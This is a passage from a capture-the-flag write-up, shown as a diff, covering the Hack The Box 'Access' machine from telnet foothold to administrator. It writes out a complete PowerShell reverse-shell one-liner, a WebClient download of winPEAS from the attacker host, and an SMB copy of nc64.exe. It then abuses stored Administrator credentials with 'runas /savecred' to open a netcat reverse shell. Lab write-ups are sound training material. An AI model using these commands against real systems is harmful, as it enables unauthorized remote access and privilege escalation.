@@ -241,3 +241,170 @@ Microsoft Telnet Server.
 C:\Users\security>whoami
 access\security
 ```
+From this telnet shell, then spawn a powershell reverse shell.
+```shell
+C:\Users\security\Desktop>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.30',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+Get the connection.
+```shell
+─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-0mgl0gm8pu]─[~/psh]
+└──╼ [★]$ nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.14.30] from (UNKNOWN) [10.129.84.178] 49159
+
+PS C:\Users\security\Desktop>
+```
+
+### 6. Enumerate from user
+System info:
+```shell
+PS C:\Users\security\Documents> systeminfo
+
+Host Name:                 ACCESS
+OS Name:                   Microsoft Windows Server 2008 R2 Standard 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                55041-507-9857321-84191
+Original Install Date:     8/21/2018, 9:43:10 PM
+System Boot Time:          1/17/2021, 10:59:32 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,506 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 3,529 MB
+Virtual Memory: In Use:    566 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 110 Hotfix(s) Installed.
+```
+The machine is Server 2008, but it seems reasonably well-patched.  
+Check user privileges:
+```shell
+─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-0mgl0gm8pu]─[~/psh]
+└──╼ [★]$ nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.14.30] from (UNKNOWN) [10.129.84.178] 49159
+
+PS C:\Users\security\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+PS C:\Users\security\Desktop> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID                                        Attributes                                        
+====================================== ================ ========================================== ==================================================
+Everyone                               Well-known group S-1-1-0                                    Mandatory group, Enabled by default, Enabled group
+ACCESS\TelnetClients                   Alias            S-1-5-21-953262931-566350628-63446256-1000 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545                               Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4                                    Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                          Well-known group S-1-2-1                                    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                Mandatory group, Enabled by default, Enabled group
+```
+To upload WinPEAS I need to use a Powershell 2.0 method.
+```shell
+PS C:\Users\security\Documents> ─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-0mgl0gm8pu]─[~/psh]
+└──╼ [★]$ nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.14.30] from (UNKNOWN) [10.129.84.178] 49160
+
+PS C:\Windows\Temp> $client = New-Object System.Net.WebClient
+PS C:\Windows\Temp> $client
+
+
+Encoding              : System.Text.SBCSCodePageEncoding
+BaseAddress           : 
+Credentials           : 
+UseDefaultCredentials : False
+Headers               : {}
+QueryString           : {}
+ResponseHeaders       : 
+Proxy                 : System.Net.WebRequest+WebProxyWrapper
+CachePolicy           : 
+IsBusy                : False
+Site                  : 
+Container             : 
+
+PS C:\Windows\Temp> $url = 'http://10.10.14.30:8000/winPEAS.exe'
+PS C:\Windows\Temp> $path = '.\winPEAS.exe'
+PS C:\Windows\Temp> $client.DownloadFile($url, $path)
+```
+It doesn't work, however, as group policy seems to prevent this accout from running exe files.  
+List stored creds:
+```shell
+PS C:\> cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=ACCESS\Administrator
+    Type: Domain Password
+    User: ACCESS\Administrator
+```
+The administrator password is being stored for use. This means I can run commands as the administrator user. This would be how the user can run exes.
+From: https://www.windows-commandline.com/windows-runas-command-prompt/   
+
+*Runas is a very useful command on Windows OS. This command enables one to run a command in the context of another user account. One example scenario where this could be useful is: Suppose you have both a normal user account and an administrator account on a computer and currently you are logged in as normal user account. Now you want to install some software on the computer, but as you do not have admin privileges you can’t install the same from the current account. One option is to switch user and login as administrator. Instead, you can do the same by simply using runas command. You just need to launch the installer from command prompt using runas command and by providing administrator login id and password.*
+  
+### 7. Get an administrator shell
+Upload nc64.exe to the machine using an SMB server:
+```shell
+C:\Users\security\Documents>copy \\10.10.14.30\jack\nc64.exe .
+        1 file(s) copied.
+
+C:\Users\security\Documents>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\security\Documents
+
+01/17/2021  12:43 PM    <DIR>          .
+01/17/2021  12:43 PM    <DIR>          ..
+01/17/2021  12:09 PM            27,136 nc.exe
+01/17/2021  12:39 PM            45,272 nc64.exe
+               2 File(s)         72,408 bytes
+               2 Dir(s)  16,772,706,304 bytes free
+```
+Then run the binary using `runas`.
+```
+C:\Users\security\Documents>runas /user:ACCESS\Administrator /savecred "nc64.exe -e cmd.exe 10.10.14.30 9998"
+```
+Catch the shell in my netcat listener.
+```bash
+─[us-dedivip-1]─[10.10.14.30]─[htb-jib1337@htb-0mgl0gm8pu]─[~/smb]
+└──╼ [★]$ nc -lvnp 9998
+listening on [any] 9998 ...
+connect to [10.10.14.30] from (UNKNOWN) [10.129.84.186] 49160
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+access\administrator
+```
